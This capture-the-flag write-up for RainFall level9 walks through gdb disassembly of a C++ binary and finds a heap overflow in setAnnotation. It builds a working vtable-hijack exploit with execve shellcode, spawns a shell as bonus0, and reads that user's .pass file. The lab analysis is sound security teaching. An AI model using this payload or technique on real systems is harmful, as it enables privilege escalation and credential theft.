# Way to bonus0

When we enter the shell `level9`, we can see the `level9` executable file.
Let's run it and see what happens.

```bash
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 ds
level9@RainFall:~$ ./level9 ds ds
```

Nothing is printed, so the behavior is invisible from the outside. Let's open it with `gdb`
and analyze it statically.

```bash
level9@RainFall:~$ gdb ./level9
```

First, let's look at the disassembly of `main`.

```gdb
(gdb) disassemble main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret
End of assembler dump.
```

## The program takes `argv`

There are no symbol names here, but the `cdecl` calling convention tells us the stack layout of
`main`'s own arguments:

```text
ebp+0x8 : argc (first argument)
ebp+0xc : argv (second argument)
```

After the prologue, the incoming arguments sit at increasing offsets from `ebp+8`, 4 bytes apart.
Two places confirm this:

- `main+10`, `cmpl $0x1,0x8(%ebp)` followed by a jump to `_exit` — this is the `argc <= 1` check
  (`0x8(%ebp)` is `argc`).
- `main+112..118`:

  ```asm
  mov    0xc(%ebp),%eax   ; eax = argv
  add    $0x4,%eax        ; eax = &argv[1]
  mov    (%eax),%eax      ; eax = argv[1]
  ```

  This dereferences `argv[1]`, which then becomes the argument to `setAnnotation`.

So the program needs exactly one argument, and that argument is the string we control.

## The symbols

Let's list every function in the binary.

```gdb
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
```

This is a small C++ program built around a class `N`. The interesting symbols are, precisely:

- `operator new(unsigned int)` (`_Znwj`) — the allocator used for each object (`new N(...)`).
- `N::N(int)` (`_ZN1NC2Ei`) — the constructor that takes an `int`.
- `N::setAnnotation(char*)` (`_ZN1N13setAnnotationEPc`) — the member function that copies our input.

`main` creates two `N` objects, calls `setAnnotation` on the first with `argv[1]`, then makes a
virtual call on the second. Let's inspect the constructor and `setAnnotation`.

## Object layout

```gdb
(gdb) disass 0x080486f6
Dump of assembler code for function _ZN1NC2Ei:
   0x080486f6 <+0>:	push   %ebp
   0x080486f7 <+1>:	mov    %esp,%ebp
   0x080486f9 <+3>:	mov    0x8(%ebp),%eax
   0x080486fc <+6>:	movl   $0x8048848,(%eax)
   0x08048702 <+12>:	mov    0x8(%ebp),%eax
   0x08048705 <+15>:	mov    0xc(%ebp),%edx
   0x08048708 <+18>:	mov    %edx,0x68(%eax)
   0x0804870b <+21>:	pop    %ebp
   0x0804870c <+22>:	ret
End of assembler dump.
```

Reading the constructor:

- `+6`, `movl $0x8048848,(%eax)` — at offset `0` of the object it stores `0x8048848`, the **vtable
  pointer**. Every `N` begins with its vtable pointer.
- `+18`, `mov %edx,0x68(%eax)` — at offset `0x68` it stores the constructor's `int` argument
  (`5` for the first object, `6` for the second).

So the object layout is:

```text
offset 0x00 : vtable pointer
offset 0x04 : annotation buffer (this is where setAnnotation writes)
...
offset 0x68 : the int passed to the constructor
total size  : 0x6c (108 bytes)  -- the value passed to operator new
```

## The vulnerability

```gdb
(gdb) disass 0x0804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   0x08048711 <+3>:	sub    $0x18,%esp
   0x08048714 <+6>:	mov    0xc(%ebp),%eax
   0x08048717 <+9>:	mov    %eax,(%esp)
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    0x8(%ebp),%edx
   0x08048722 <+20>:	add    $0x4,%edx
   0x08048725 <+23>:	mov    %eax,0x8(%esp)
   0x08048729 <+27>:	mov    0xc(%ebp),%eax
   0x0804872c <+30>:	mov    %eax,0x4(%esp)
   0x08048730 <+34>:	mov    %edx,(%esp)
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret
End of assembler dump.
```

In C terms `setAnnotation(char *input)` does:

```c
memcpy(this + 4, input, strlen(input));
```

- `+12` calls `strlen(input)` to *measure* the length of our input.
- `+20` computes the destination `this + 4` (the annotation buffer, offset `0x04`).
- `+37` copies exactly `strlen(input)` bytes there.

The key point: `strlen` only *measures* the length — it does not *limit* it. There is no bounds
check (`cmp`) anywhere before the `memcpy`. The destination is a fixed-size region inside a 108-byte
object, but the copy length is attacker-controlled. That is an unbounded heap buffer overflow:
whatever we pass is written past the object, straight into the next object on the heap.

## How the virtual call becomes a target

A C++ object with virtual functions stores, at offset `0`, a pointer to its **vtable** — a table
of virtual-function addresses. Calling a virtual method means: read the vtable pointer from the
object, read a function address out of the vtable, and `call` it. That is a triple dereference, and
every step reads memory we may be able to corrupt.

Look at how `main` invokes the virtual method on the second object:

```gdb
   0x0804867c <+136>:	mov    0x10(%esp),%eax   ; eax = obj2
   0x08048680 <+140>:	mov    (%eax),%eax        ; eax = *(obj2)       = vtable pointer
   0x08048682 <+142>:	mov    (%eax),%edx        ; edx = *(vtable)     = vtable[0] (function addr)
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx              ; call vtable[0]
```

The call is effectively `(*(*obj2))()` — three dereferences starting from `obj2`:

1. `*(obj2)` — the vtable pointer, read from offset `0` of `obj2`.
2. `*(vtable)` — the first function address in the vtable.
3. `call` that address.

The overflow on the first object reaches into the second object. If we overwrite `obj2`'s vtable
pointer (its offset `0`), we control step 1 — and therefore the whole chain, redirecting the `call`
to anything we like.

## Measuring the two objects

Let's break right after both objects have been constructed and their pointers saved on the stack
(`main+92`), and run with a short dummy argument.

```gdb
(gdb) break *0x8048650
Breakpoint 1 at 0x8048650
(gdb) run AAA
Starting program: /home/user/level9/level9 AAA

Breakpoint 1, 0x08048650 in main ()
(gdb) p/x $ebx
$1 = 0x804a078
(gdb) x/wx $esp+0x1c
0xbffff72c:	0x0804a008
```

Watch the labels carefully:

- The **first** object (allocated first, at `main+58` and saved to `0x1c(%esp)`) is read back with
  `x/wx $esp+0x1c` → `0x804a008`. Call it `obj1`.
- The **second** object (allocated at `main+74`, currently in `ebx` at this breakpoint) is
  `p/x $ebx` → `0x804a078`. Call it `obj2`.

So `obj1 = 0x804a008` (smaller address) and `obj2 = 0x804a078` (larger address). The gap is a
positive number:

```text
obj2 - obj1 = 0x804a078 - 0x804a008 = 0x70 = 112 bytes
```

`setAnnotation` writes starting at `obj1 + 4`, so the distance from where the copy begins to the
start of `obj2` (where its vtable pointer lives) is:

```text
0x70 - 4 = 0x6c = 108 bytes
```

In other words, after 108 bytes of input, the next 4 bytes land exactly on `obj2`'s vtable pointer.

## Payload design

The destination of the `memcpy` is `obj1 + 4 = 0x804a00c`, which corresponds to **offset 0** of our
input. We lay the input out so the triple dereference lands on our shellcode:

- Offset `0` (`= 0x804a00c`) holds a **pointer to the shellcode**. Since the shellcode itself must
  live somewhere, we place it right after this pointer, starting at **offset 4 (`= 0x804a010`)**.
  So offset `0` contains `0x804a010`.
- The final 4 bytes (offset `108`) overwrite `obj2`'s vtable pointer with `0x804a00c` — the address
  of our fake vtable, which is simply offset `0` of our buffer (where we stored the shellcode
  pointer).

At the virtual call this resolves as:

```text
*(obj2)        = 0x804a00c      ; the vtable pointer we planted
*(0x804a00c)   = 0x804a010      ; "vtable[0]" = the shellcode-address word at offset 0
call 0x804a010                  ; jump into the shellcode
```

Full layout (112 bytes total):

```text
[offset 0]    shellcode address  0x804a010  ->  \x10\xa0\x04\x08   (4 bytes)
[offset 4]    shellcode (execve "/bin//sh", null-free)              (25 bytes)
[offset 29]   NOP padding (\x90)                                    (79 bytes)
[offset 108]  obj2 vtable overwrite  0x804a00c  ->  \x0c\xa0\x04\x08 (4 bytes)

check: 4 + 25 + 79 + 4 = 112
```

The 25-byte shellcode is the classic `execve("/bin//sh", ...)` stub (`/bin//sh` keeps the string
word-aligned while being equivalent to `/bin/sh`).

A note on null bytes: because the copy length comes from `strlen`, any `\x00` in the input would cut
the string short and shorten the copy. Both addresses (`\x10\xa0\x04\x08` and `\x0c\xa0\x04\x08`)
and the shellcode are null-free, so the full 112 bytes are copied intact.

## Exploit

```bash
python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x90"*79 + "\x0c\xa0\x04\x08"'
```

Feeding that as `argv[1]` hijacks the virtual call into our shellcode and gives us a shell as
`bonus0`:

```bash
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x90"*79 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
result...
```
